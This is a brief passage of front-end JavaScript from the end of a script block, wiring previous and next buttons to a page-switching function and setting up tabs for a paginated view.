      button.addEventListener('click', () => showPage(currentIndex - 1, true));
    });

    nextButtons.forEach((button) => {
      button.addEventListener('click', () => showPage(currentIndex + 1, true));
    });

    createTabs();
    showPage(currentIndex);
  })();
</script>
